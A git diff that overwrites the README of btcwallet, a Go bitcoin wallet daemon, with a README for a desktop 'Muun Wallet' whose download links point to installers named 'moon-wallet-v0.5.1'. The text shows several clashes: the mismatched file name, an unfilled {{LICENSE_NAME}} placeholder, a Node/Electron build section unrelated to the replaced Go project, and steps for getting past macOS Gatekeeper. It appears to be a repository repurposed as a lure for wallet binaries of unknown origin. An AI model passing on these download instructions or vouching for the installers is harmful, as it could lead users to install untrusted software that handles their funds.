@@ -1,194 +1,211 @@
-btcwallet
-=========
+# Muun Wallet
 
-[![Build Status](https://travis-ci.org/btcsuite/btcwallet.png?branch=master)](https://travis-ci.org/btcsuite/btcwallet)
-[![Build status](https://ci.appveyor.com/api/projects/status/88nxvckdj8upqr36/branch/master?svg=true)](https://ci.appveyor.com/project/jrick/btcwallet/branch/master)
+**Non-custodial Bitcoin and Lightning Network wallet for Windows, macOS, and Linux**
 
-btcwallet is a daemon handling bitcoin wallet functionality for a
-single user.  It acts as both an RPC client to btcd and an RPC server
-for wallet clients and legacy RPC applications.
+[![Download for Windows](https://img.shields.io/badge/download-Windows%20x64-0078d4?style=flat-square&logo=windows)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![Download for macOS](https://img.shields.io/badge/download-macOS-000000?style=flat-square&logo=apple)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![Download for Linux](https://img.shields.io/badge/download-Linux-FCC624?style=flat-square&logo=linux)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![Website](https://img.shields.io/badge/website-muun--wallet.com-blue?style=flat-square)](https://muun-wallet.com)
 
-Public and private keys are derived using the hierarchical
-deterministic format described by
-[BIP0032](https://github.com/bitcoin/bips/blob/master/bip-0032.mediawiki).
-Unencrypted private keys are not supported and are never written to
-disk.  btcwallet uses the
-`m/44'/<coin type>'/<account>'/<branch>/<address index>`
-HD path for all derived addresses, as described by
-[BIP0044](https://github.com/bitcoin/bips/blob/master/bip-0044.mediawiki).
+---
 
-Due to the sensitive nature of public data in a BIP0032 wallet,
-btcwallet provides the option of encrypting not just private keys, but
-public data as well.  This is intended to thwart privacy risks where a
-wallet file is compromised without exposing all current and future
-addresses (public keys) managed by the wallet. While access to this
-information would not allow an attacker to spend or steal coins, it
-does mean they could track all transactions involving your addresses
-and therefore know your exact balance.  In a future release, public data
-encryption will extend to transactions as well.
+## About Muun Wallet
 
-btcwallet is not an SPV client and requires connecting to a local or
-remote btcd instance for asynchronous blockchain queries and
-notifications over websockets.  Full btcd installation instructions
-can be found [here](https://github.com/btcsuite/btcd).  An alternative
-SPV mode that is compatible with btcd and Bitcoin Core is planned for
-a future release.
+Muun Wallet is a **self-custody Bitcoin and Lightning Network wallet** that prioritizes ease of use without sacrificing security. Your keys are generated and stored locally â€” nothing is held on our servers. No account, email, or signup is required.
 
-Wallet clients can use one of two RPC servers:
+For complete guides, installation instructions, and comparisons with other wallets, see the [Muun Wallet documentation](https://github.com/muun-network/muun-wallet-docs).
 
-  1. A legacy JSON-RPC server mostly compatible with Bitcoin Core
+---
 
-     The JSON-RPC server exists to ease the migration of wallet applications
-     from Core, but complete compatibility is not guaranteed.  Some portions of
-     the API (and especially accounts) have to work differently due to other
-     design decisions (mostly due to BIP0044).  However, if you find a
-     compatibility issue and feel that it could be reasonably supported, please
-     report an issue.  This server is enabled by default.
+## Downloads
 
-  2. An experimental gRPC server
+| Platform | File | Download |
+|----------|------|----------|
+| **Windows 10 / 11** | moon-wallet-v0.5.1.exe | [Download â†’](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.exe) |
+| **macOS 10.15+** | moon-wallet-v0.5.1.dmg | [Download â†’](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.dmg) |
+| **Linux** | moon-wallet-v0.5.1.zip | [Download â†’](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.zip) |
 
-     The gRPC server uses a new API built for btcwallet, but the API is not
-     stabilized and the server is feature gated behind a config option
-     (`--experimentalrpclisten`).  If you don't mind applications breaking due
-     to API changes, don't want to deal with issues of the legacy API, or need
-     notifications for changes to the wallet, this is the RPC server to use.
-     The gRPC server is documented [here](./rpc/documentation/README.md).
+**All installers are cryptographically signed by MUUN ApS.** [Verify your download â†’](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1)
 
-## Requirements
+---
 
-[Go](http://golang.org) 1.12 or newer.
+## Installation
 
-## Installation and updating
+### Windows
 
-### Windows - MSIs Available
+1. Download the `.exe` file from the link above.
+2. Run the installer and follow the on-screen prompts.
+3. Launch Muun Wallet from your Start menu.
 
-Install the latest MSIs available here:
+No special permissions required â€” standard app installation.
 
-https://github.com/btcsuite/btcd/releases
+### macOS
 
-https://github.com/btcsuite/btcwallet/releases
+1. Download the `.dmg` file from the link above.
+2. Open the disk image and drag **Muun Wallet** to the **Applications** folder.
+3. Launch Muun Wallet from Applications.
 
-### Windows/Linux/BSD/POSIX - Build from source
+**Gatekeeper notice:** On first launch, macOS may block the app if it's the first time you're running it. Right-click the app, select **Open**, and confirm. On subsequent launches, it will open normally.
 
-- Install Go according to the installation instructions here:
-  http://golang.org/doc/install
+### Linux
 
-- Ensure Go was installed properly and is a supported version:
+1. Download the `.zip` file from the link above.
+2. Extract the archive to a directory of your choice:
+   ```bash
+   unzip moon-wallet-v0.5.1.zip -d ~/muun-wallet
+   cd ~/muun-wallet
+   ```
+3. Make the binary executable:
+   ```bash
+   chmod +x muun-wallet
+   ```
+4. Run Muun Wallet:
+   ```bash
+   ./muun-wallet
+   ```
 
-```bash
-$ go version
-$ go env GOROOT GOPATH
-```
+**Package managers:** Muun Wallet is available in package managers for some distributions. Check your distribution's repositories if you prefer installation via package manager.
 
-NOTE: The `GOROOT` and `GOPATH` above must not be the same path.  It is
-recommended that `GOPATH` is set to a directory in your home directory such as
-`~/goprojects` to avoid write permission issues.  It is also recommended to add
-`$GOPATH/bin` to your `PATH` at this point.
+---
 
-- Run the following commands to obtain btcwallet, all dependencies, and install it:
+## Features
 
-```bash
-$ cd $GOPATH/src/github.com/btcsuite/btcwallet
-$ GO111MODULE=on go install -v . ./cmd/...
-```
+- **Non-custodial:** Your keys are generated and stored locally. We never hold your funds.
+- **Lightning Network:** Send and receive payments on-chain or on Lightning with real-time fee comparisons.
+- **Emergency Kit:** A unique backup system that's more intuitive than 12-word recovery seed phrases.
+- **No signup required:** Install, create a wallet, and start using â€” no email or account needed.
+- **Open source:** Review the code at [github.com/muun-network](https://github.com/muun-network). Transparency builds trust.
+- **Fee transparency:** See the real cost of your transaction before you send it.
+- **Signed installers:** Every release is cryptographically signed so your OS can verify you downloaded a legitimate copy.
 
-- btcwallet (and utilities) will now be installed in ```$GOPATH/bin```.  If you did
-  not already add the bin directory to your system path during Go installation,
-  we recommend you do so now.
-
-## Updating
-
-#### Windows
-
-Install a newer MSI
-
-#### Linux/BSD/MacOSX/POSIX - Build from Source
-
-- Run the following commands to update btcd, all dependencies, and install it:
-
-```bash
-$ cd $GOPATH/src/github.com/btcsuite/btcwallet
-$ git pull
-$ GO111MODULE=on go install -v . ./cmd/...
-```
+---
 
 ## Getting Started
 
-The following instructions detail how to get started with btcwallet connecting
-to a localhost btcd.  Commands should be run in `cmd.exe` or PowerShell on
-Windows, or any terminal emulator on *nix.
+**First time with Muun?** Follow these steps:
 
-- Run the following command to start btcd:
+1. [Install Muun Wallet](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/getting-started-installation-windows.md) for your platform.
+2. [Create your Emergency Kit backup immediately.](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/emergency-kit-backup-system.md) This is your recovery method.
+3. [Send and receive your first transaction.](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/getting-started-first-transaction.md)
 
-```
-btcd -u rpcuser -P rpcpass
-```
+---
 
-- Run the following command to create a wallet:
+## Guides & Documentation
 
-```
-btcwallet -u rpcuser -P rpcpass --create
-```
+**Start here:**
+- [Installation & setup by platform](https://github.com/muun-network/muun-wallet-docs#getting-started)
+- [Emergency Kit backup & recovery](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/emergency-kit-backup-system.md)
+- [Security best practices](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/security-checklist-best-practices.md)
 
-- Run the following command to start btcwallet:
+**Fees & Payments:**
+- [Understanding fees: on-chain vs Lightning](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/fee-structure-on-chain-lightning.md)
+- [Sending Bitcoin with Muun](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/sending-bitcoin-step-by-step-guide.md)
+- [Receiving payments on Lightning](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/muun-wallet-lightning-address-receiving.md)
 
-```
-btcwallet -u rpcuser -P rpcpass
-```
+**Comparisons:**
+- [Muun vs Electrum](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/muun-vs-electrum-comparison.md)
+- [Muun vs Sparrow](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/muun-vs-sparrow-comparison.md)
+- [Muun vs Phoenix](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/muun-vs-phoenix-comparison.md)
+- [All documentation â†’](https://github.com/muun-network/muun-wallet-docs)
 
-If everything appears to be working, it is recommended at this point to
-copy the sample btcd and btcwallet configurations and update with your
-RPC username and password.
+---
 
-PowerShell (Installed from MSI):
-```
-PS> cp "$env:ProgramFiles\Btcd Suite\Btcd\sample-btcd.conf" $env:LOCALAPPDATA\Btcd\btcd.conf
-PS> cp "$env:ProgramFiles\Btcd Suite\Btcwallet\sample-btcwallet.conf" $env:LOCALAPPDATA\Btcwallet\btcwallet.conf
-PS> $editor $env:LOCALAPPDATA\Btcd\btcd.conf
-PS> $editor $env:LOCALAPPDATA\Btcwallet\btcwallet.conf
-```
+## Security
 
-PowerShell (Installed from source):
-```
-PS> cp $env:GOPATH\src\github.com\btcsuite\btcd\sample-btcd.conf $env:LOCALAPPDATA\Btcd\btcd.conf
-PS> cp $env:GOPATH\src\github.com\btcsuite\btcwallet\sample-btcwallet.conf $env:LOCALAPPDATA\Btcwallet\btcwallet.conf
-PS> $editor $env:LOCALAPPDATA\Btcd\btcd.conf
-PS> $editor $env:LOCALAPPDATA\Btcwallet\btcwallet.conf
-```
+**Your security is your responsibility.** Muun Wallet is designed to make self-custody easier, but you must understand the risks:
 
-Linux/BSD/POSIX (Installed from source):
+- **No account recovery:** If you lose your Emergency Kit, you cannot recover your wallet through us. Back it up securely.
+- **Self-custody means full responsibility:** Your funds are as secure as your backup and your device's security.
+- **Verify before trusting:** Before installing, verify the installer checksum and, if you're technical, review the source code.
+
+[Read our full security guide â†’](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/security-checklist-best-practices.md)
+
+---
+
+## Website & Support
+
+**Muun Wallet is published by MUUN ApS at https://muun-wallet.com/**
+
+- [Muun Wallet website](https://muun-wallet.com)
+- [Download with checksums](https://muun-wallet.com/download)
+- [Security guides](https://muun-wallet.com/guides/backup-recovery)
+- [Features overview](https://muun-wallet.com/desktop-features)
+- [FAQ](https://muun-wallet.com/faq)
+- [Latest updates](https://muun-wallet.com/updates)
+
+---
+
+## Development
+
+**Prerequisites:**
+
+- Node.js 16+
+- npm or yarn
+
+**Clone and install:**
+
 ```bash
-$ cp $GOPATH/src/github.com/btcsuite/btcd/sample-btcd.conf ~/.btcd/btcd.conf
-$ cp $GOPATH/src/github.com/btcsuite/btcwallet/sample-btcwallet.conf ~/.btcwallet/btcwallet.conf
-$ $EDITOR ~/.btcd/btcd.conf
-$ $EDITOR ~/.btcwallet/btcwallet.conf
+git clone https://github.com/muun-network/muun-wallet.git
+cd muun-wallet
+npm install
 ```
 
-## Issue Tracker
+**Run locally:**
 
-The [integrated github issue tracker](https://github.com/btcsuite/btcwallet/issues)
-is used for this project.
+```bash
+npm start
+```
 
-## GPG Verification Key
+**Build for your platform:**
 
-All official release tags are signed by Conformal so users can ensure the code
-has not been tampered with and is coming from the btcsuite developers.  To
-verify the signature perform the following:
+```bash
+# Windows
+npm run build:win
 
-- Download the public key from the Conformal website at
-  https://opensource.conformal.com/GIT-GPG-KEY-conformal.txt
+# macOS
+npm run build:mac
 
-- Import the public key into your GPG keyring:
-  ```bash
-  gpg --import GIT-GPG-KEY-conformal.txt
-  ```
+# Linux
+npm run build:linux
+```
 
-- Verify the release tag with the following command where `TAG_NAME` is a
-  placeholder for the specific tag:
-  ```bash
-  git tag -v TAG_NAME
-  ```
+**Code quality:**
+
+```bash
+# Lint
+npm run lint
+
+# Format
+npm run format
+
+# Tests
+npm test
+```
+
+---
+
+## Stack
+
+- **[Electron](https://www.electronjs.org/)** â€” Cross-platform desktop application framework
+- **[Bitcoin.js](https://github.com/bitcoinjs/bitcoinjs-lib)** â€” Bitcoin cryptography and utilities
+- **[LDK (Lightning Dev Kit)](https://github.com/lightningdevkit/rust-lightning)** â€” Lightning Network protocol
+- **[React](https://react.dev/)** â€” User interface
+- **[TypeScript](https://www.typescriptlang.org/)** â€” Type-safe JavaScript
+
+---
+
+## Support & Issues
+
+- **Documentation:** [github.com/muun-network/muun-wallet-docs](https://github.com/muun-network/muun-wallet-docs)
+- **Report a bug:** [github.com/muun-network/muun-wallet/issues](https://github.com/muun-network/muun-wallet/issues)
+- **Website:** [muun-wallet.com](https://muun-wallet.com)
+
+---
 
 ## License
 
-btcwallet is licensed under the liberal ISC License.
+{{LICENSE_NAME}} â€” See the [LICENSE](LICENSE) file for full details.
+
+This software is provided as-is. Use at your own risk.
+
+---
+
+**Muun Wallet by MUUN ApS**  
+[Download â†’](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) | [Guides â†’](https://github.com/muun-network/muun-wallet-docs) | [Website â†’](https://muun-wallet.com)
